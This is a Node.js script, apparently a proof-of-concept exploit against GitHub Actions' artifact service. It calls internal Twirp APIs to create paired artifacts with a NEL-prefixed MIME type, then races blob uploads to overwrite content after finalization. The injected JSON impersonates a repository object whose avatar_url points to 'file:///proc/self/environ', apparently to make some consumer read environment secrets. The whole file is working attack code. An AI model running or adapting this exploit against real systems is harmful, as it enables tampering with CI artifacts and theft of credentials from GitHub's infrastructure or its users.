import { createHash } from 'node:crypto';
import { BlobClient } from '@azure/storage-blob';
import { internalArtifactTwirpClient } from '../node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
import { getBackendIdsFromToken } from '../node_modules/@actions/artifact/lib/internal/shared/util.js';
import { StringValue } from '../node_modules/@actions/artifact/lib/generated/index.js';

const ids = getBackendIdsFromToken();
const client = internalArtifactTwirpClient();
const weird = '\u0085application/json';
const repositoryName = process.env.GITHUB_REPOSITORY;

function payload(artifactId) {
  return Buffer.from(JSON.stringify({
    full_name: `${repositoryName}/actions/artifacts/${artifactId}/zip`,
    owner: { login: 'cassette', avatar_url: 'file:///proc/self/environ' },
    description: 'Repo Cassette private artifact',
    stargazers_count: 0,
  }));
}

async function create(name, version, mime) {
  const result = await client.CreateArtifact({
    workflowRunBackendId: ids.workflowRunBackendId,
    workflowJobRunBackendId: ids.workflowJobRunBackendId,
    name,
    version,
    mimeType: StringValue.create({ value: mime }),
  });
  if (!result.ok) throw new Error('CreateArtifact returned ok=false');
  return result;
}

async function upload(url, bytes, mime = weird) {
  await new BlobClient(url).getBlockBlobClient().uploadData(bytes, {
    blobHTTPHeaders: { blobContentType: mime },
  });
}

async function finalize(name, bytes) {
  const hash = createHash('sha256').update(bytes).digest('hex');
  const result = await client.FinalizeArtifact({
    workflowRunBackendId: ids.workflowRunBackendId,
    workflowJobRunBackendId: ids.workflowJobRunBackendId,
    name,
    size: String(bytes.length),
    hash: StringValue.create({ value: `sha256:${hash}` }),
  });
  if (!result.ok) throw new Error('FinalizeArtifact returned ok=false');
  return String(result.artifactId);
}

async function race(index) {
  const name = `cassette-sequential-${process.env.GITHUB_RUN_ID}-${index}-${Date.now()}`;
  const raw = await create(name, 7, 'application/json');
  const legacy = await create(name, 6, weird);
  const placeholder = Buffer.from('{"probe":"placeholder"}');
  await upload(legacy.signedUploadUrl, placeholder, weird);
  await upload(raw.signedUploadUrl, placeholder, 'application/json');
  const artifactId = await finalize(name, placeholder);
  const body = payload(artifactId);
  const finalUpload = index % 2 === 0 ? legacy : raw;
  const finalMime = index % 2 === 0 ? weird : 'application/json';
  await upload(finalUpload.signedUploadUrl, body, finalMime);
  return { name, artifactId, repository: `${repositoryName}/actions/artifacts/${artifactId}/zip`, finalUpload: index % 2 === 0 ? 'legacy' : 'raw' };
}

const results = [];
for (let index = 0; index < 4; index += 1) {
  try {
    const result = await race(index);
    results.push(result);
    console.log(`BUILT ${JSON.stringify(result)}`);
  } catch (error) {
    console.log(`SKIPPED race ${index}: ${error.message}`);
  }
}

if (!results.length) throw new Error('No race artifact could be created');
console.log(`MANIFEST ${JSON.stringify(results)}`);
